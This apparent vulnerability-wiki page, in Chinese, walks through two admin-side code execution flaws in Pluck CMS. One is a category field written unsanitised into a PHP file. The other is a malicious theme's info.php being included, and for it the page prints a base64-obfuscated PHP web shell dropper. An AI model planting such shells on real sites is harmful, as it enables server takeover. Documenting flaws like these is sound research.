@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Pluck%20cms/Pluck%20CMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Pluck CMS后台另两处任意代码执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Pluck CMS\u540e\u53f0\u53e6\u4e24\u5904\u4efb\u610f\u4ee3\u7801\u6267\u884c", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2018-1058）PostgreSQL 提权漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Pluck%20CMS%204.7.10%20%E5%90%8E%E5%8F%B0%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Pluck%20CMS%204.7.10%20%E5%90%8E%E5%8F%B0%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-link">
+        Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="pluck-cms">Pluck CMS后台另两处任意代码执行<a class="headerlink" href="#pluck-cms" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h4 id="_4">第一处：过滤不严导致单引号逃逸<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>在function.php里面blog_save_post()函数</p>
+<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">blog_save_post</span><span class="p">(</span><span class="o">$</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">category</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">current_seoname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">force_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">//</span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;posts&#39;</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">exists</span><span class="p">,</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="p">;</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">it</span><span class="o">.</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">is_dir</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">mkdir</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="p">);</span>
+<span class="w">        </span><span class="n">chmod</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="p">,</span><span class="w"> </span><span class="mi">0777</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">//</span><span class="n">Create</span><span class="w"> </span><span class="n">seo</span><span class="o">-</span><span class="n">filename</span>
+<span class="w">    </span><span class="o">$</span><span class="n">seoname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seo_url</span><span class="p">(</span><span class="o">$</span><span class="n">title</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="n">Sanitize</span><span class="w"> </span><span class="n">variables</span><span class="o">.</span>
+<span class="w">    </span><span class="o">$</span><span class="n">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sanitize</span><span class="p">(</span><span class="o">$</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="bp">true</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sanitizePageContent</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">current_seoname</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">current_filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">blog_get_post_filename</span><span class="p">(</span><span class="o">$</span><span class="n">current_seoname</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">parts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">current_filename</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+<span class="w">        </span><span class="o">//</span><span class="n">Get</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">post</span><span class="w"> </span><span class="n">time</span><span class="o">.</span>
+<span class="w">        </span><span class="n">include</span><span class="w"> </span><span class="n">BLOG_POSTS_DIR</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">current_filename</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">seoname</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">$</span><span class="n">current_seoname</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">unlink</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">current_filename</span><span class="p">);</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_dir</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">current_seoname</span><span class="p">))</span>
+<span class="w">                </span><span class="n">rename</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">current_seoname</span><span class="p">,</span><span class="w"> </span><span class="n">BLOG_POSTS_DIR</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">seoname</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_dir_contents</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;files&#39;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="n">Find</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">number</span><span class="o">.</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">files</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">count</span><span class="p">(</span><span class="o">$</span><span class="n">files</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">number</span><span class="o">++</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">            </span><span class="o">$</span><span class="n">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">force_time</span><span class="p">))</span>
+<span class="w">            </span><span class="o">$</span><span class="n">post_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">time</span><span class="p">();</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">            </span><span class="o">$</span><span class="n">post_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">force_time</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">//</span><span class="n">Save</span><span class="w"> </span><span class="n">information</span><span class="o">.</span>
+<span class="w">    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;post_title&#39;</span><span class="p">]</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">title</span><span class="p">;</span>
+<span class="w">    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;post_category&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">category</span><span class="p">;</span>
+<span class="w">    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;post_content&#39;</span><span class="p">]</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">content</span><span class="p">;</span>
+<span class="w">    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;post_time&#39;</span><span class="p">]</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">post_time</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">save_file</span><span class="p">(</span><span class="n">BLOG_POSTS_DIR</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">number</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.$</span><span class="n">seoname</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="n">Return</span><span class="w"> </span><span class="n">seoname</span><span class="w"> </span><span class="n">under</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">post</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="p">(</span><span class="n">to</span><span class="w"> </span><span class="n">allow</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">redirect</span><span class="p">)</span><span class="o">.</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">seoname</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>其中</p>
+<div class="codehilite"><pre><span></span><code>$data[&#39;post_title&#39;]    = $title;
+$data[&#39;post_category&#39;] = $category;
+$data[&#39;post_content&#39;]  = $content;
+$data[&#39;post_time&#39;]     = $post_time;
+</code></pre></div>
+
+<p>$title $content 均被过滤，$post_time不可控，$category可控</p>
+<p>所以只要把$cont2变成我们的payload即可</p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId25.shtml" /></p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId26.shtml" /></p>
+<h4 id="_5">第二处：安装模版+文件包含导致任意命令执行<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。</p>
+<h5 id="1">1、直接访问失败<a class="headerlink" href="#1" title="Permanent link">&para;</a></h5>
+<p>首先准备一个shell.php里面是我们的phpinfo();</p>
+<p>然后打包成shell.zip，直接上传主题</p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId29.shtml" /></p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.shtml" /></p>
+<p>发现确实上传并且解压成功</p>
+<p>但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问</p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId31.shtml" /></p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId32.shtml" /></p>
+<h5 id="2">2、文件包含突破<a class="headerlink" href="#2" title="Permanent link">&para;</a></h5>
+<p>所以就想到需要找一个位置对其进行包含，来达到执行的目的。</p>
+<p>首先看到admin.php中关于theme的部分</p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId34.shtml" /></p>
+<p>跟进 data/inc/theme.php，发现调用了get_themes()方法</p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId35.shtml" /></p>
+<p>跟进 functions.all.php，查看get_themes()方法</p>
+<div class="codehilite"><pre><span></span><code>function get_themes() {
+    $dirs = read_dir_contents(&#39;data/themes&#39;, &#39;dirs&#39;);
+    if ($dirs) {
+        natcasesort($dirs);
+        foreach ($dirs as $dir) {
+            if (file_exists(&#39;data/themes/&#39;.$dir.&#39;/info.php&#39;)) {
+                include_once (&#39;data/themes/&#39;.$dir.&#39;/info.php&#39;);
+                $themes[] = array(
+                    &#39;title&#39;   =&gt; $themename,
+                    &#39;dir&#39; =&gt; $dir
+                );
+            }
+        }
+        return $themes;
+    }
+    else
+        return false;
+}
+</code></pre></div>
+
+<p>发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件</p>
+<p>此时info.php可控，就导致了任意代码执行。</p>
+<h5 id="3">3、利用方法<a class="headerlink" href="#3" title="Permanent link">&para;</a></h5>
+<p>首先准备一个info.php</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">&#39;x.php&#39;</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==&#39;</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>然后打包压缩成shell.zip</p>
+<p>上传安装主题，然后点击回到主题页，此时触发文件包含。</p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId37.shtml" /></p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId38.shtml" /></p>
+<p><img alt="" src="../resource/PluckCMS%E5%90%8E%E5%8F%B0%E5%8F%A6%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId39.shtml" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2018-1058）PostgreSQL 提权漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Pluck%20CMS%204.7.10%20%E5%90%8E%E5%8F%B0%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Pluck%20CMS%204.7.10%20%E5%90%8E%E5%8F%B0%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-link">
+        Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
